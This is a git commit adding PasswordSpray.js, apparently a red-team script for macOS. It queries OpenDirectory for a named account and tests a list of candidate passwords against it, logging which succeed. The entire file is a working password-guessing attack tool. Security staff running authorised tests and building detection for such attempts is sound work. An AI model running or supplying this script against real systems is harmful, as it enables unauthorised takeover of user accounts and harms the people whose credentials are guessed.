6bc6540ba424e2d9407402c67dd6d570392ed8c1
Leo Pitt <17372992+D00MFist@users.noreply.github.com>
2022-01-27 13:20:27 -0500

    Create PasswordSpray.js

---
+++ PasswordSpray.js
@@ -0,0 +1,28 @@
+function test_password(account, creds) {
+    ObjC.import("OpenDirectory");
+    var session = $.ODSession.defaultSession;
+    var sessionType = 0x2201 // $.kODNodeTypeAuthentication
+    var recType = $.kODRecordTypeUsers
+    var node = $.ODNode.nodeWithSessionTypeError(session, sessionType, $());
+    var output = ""
+    var results = []
+    var user = node.recordWithRecordTypeNameAttributesError(recType, $(account), $(), $())
+    try {
+        var passwords = creds.split(", ")
+        for (var key in passwords) {
+            if (user.js !== undefined) {
+                if (user.verifyPasswordError($(passwords[key]), $())) {
+                    output += "Successful authentication as: " + account + " : " + passwords[key] + "\n"
+                } else {
+                    output += "Failed authentication as: " + account + " : " + passwords[key] + "\n"
+                }
+            } else {
+                output += "User " + account + " does not exist"
+                break;
+            }
+        }
+    } catch (error) {
+        output += error.toString()
+    }
+    return output
+}
